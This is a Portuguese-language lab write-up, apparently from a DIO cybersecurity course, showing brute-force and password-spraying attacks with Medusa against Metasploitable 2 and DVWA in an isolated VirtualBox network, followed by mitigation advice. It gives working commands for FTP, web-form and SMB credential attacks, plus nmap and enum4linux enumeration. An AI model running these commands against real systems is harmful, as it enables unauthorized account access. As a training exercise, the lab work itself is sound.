# Projeto_DIO

# 🛡️ Simulação de Ataques Brute Force com Medusa e Kali Linux

![Kali Linux](https://img.shields.io/badge/OS-Kali_Linux-blue?logo=kali-linux)
![Metasploitable](https://img.shields.io/badge/Target-Metasploitable_2-red)
![Tool](https://img.shields.io/badge/Tool-Medusa-dragon)
![Status](https://img.shields.io/badge/Status-Concluído-brightgreen)

## 📌 Descrição do Projeto
Este projeto foi desenvolvido como parte do desafio prático da plataforma **DIO (Digital Innovation One)**. O objetivo principal é realizar auditoria de segurança e simulação de ataques de Força Bruta (*Brute Force*) e *Password Spraying* utilizando a ferramenta **Medusa** no ambiente controlado do **Kali Linux**, tendo como alvo a aplicação vulnerável **Metasploitable 2**.
______________________
O laboratório foi montado utilizando o **Oracle VirtualBox** em uma rede isolada do tipo *Host-Only*:

- **Atacante:** Kali Linux (IP: `192.168.56.102`)
- **Alvo:** Metasploitable 2 (IP: `192.168.56.101`)
- **Rede:** Host-Only Adapter (`192.168.56.0/24`)

---

## 🚀 Etapas do Desafio e Comandos Utilizados

### 1. Mapeamento e Reconhecimento
Antes de iniciar os testes de força bruta, foi realizada a enumeração de serviços ativos no alvo utilizando o `nmap`:

echo -e "msfadmin\nuser\nadmin\nroot" > users.txt
echo -e "123456\nmsfadmin\npassword\nadmin" > passwords.txt

```bash
nmap -sV -p 21,139,445 192.168.56.102
````
Cenário 1: Ataque Brute Force no Serviço FTP (Porta 21)
Foi utilizado o Medusa com dicionários personalizados de usuários (users.txt) e senhas (passwords.txt):

````Bash
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp
````
Resultado: Credencial válida encontrada com sucesso (msfadmin:msfadmin).

<img width="698" height="531" alt="medusa" src="https://github.com/user-attachments/assets/a429aa74-412c-4998-9e2a-25dd92f1b4e1" />


Cenário 2: Automação de tentativas em formulário web (DVWA)
````Bash
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M http \
 -m PAGE: '/dvwa/login.php' \
 -m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
 -m 'FAIL=Login failed' -t 6
````
<img width="703" height="550" alt="automação" src="https://github.com/user-attachments/assets/a3ae986e-d033-46ba-9316-3d9761da5732" />

Cenário 3; password spraying em SMB
````Bash
enum4linux -a 192.168.56.101 | tee enum4_output.txt
````
````Bash
medusa -h 192.168.56.101 -U smb_users.txt -P senha_sp.txt -M smbnt -t 2 -T 50
````
<img width="668" height="521" alt="SMB check" src="https://github.com/user-attachments/assets/2d35bd24-ca77-40d8-a6e0-02e9fa17f3be" />


Recomendações de Mitigação e Prevenção
Para proteger os serviços auditados contra os ataques demonstrados, recomendam-se as seguintes medidas defensivas:

Política de Senhas Fortes: Exigir senhas complexas (mínimo de 12 a 16 caracteres, com combinação de letras, números e símbolos) para dificultar ataques baseados em dicionário.

Mecanismos de Account Lockout: Implementar bloqueio temporário de conta após N tentativas incorretas de login.

Múltiplo Fator de Autenticação (MFA): Habilitar 2FA/MFA sempre que possível, inviabilizando o acesso mesmo que a senha seja descoberta.

Rate Limiting e CAPTCHA: Aplicar limite de requisições por IP e desafios CAPTCHA em formulários de login Web.

Monitoramento e SIEM: Configurar alertas para detectar rajadas de falhas de autenticação em intervalos de tempo curtos.

Desenvolvido por LIBERATO durante os estudos de Cibersegurança na DIO. 

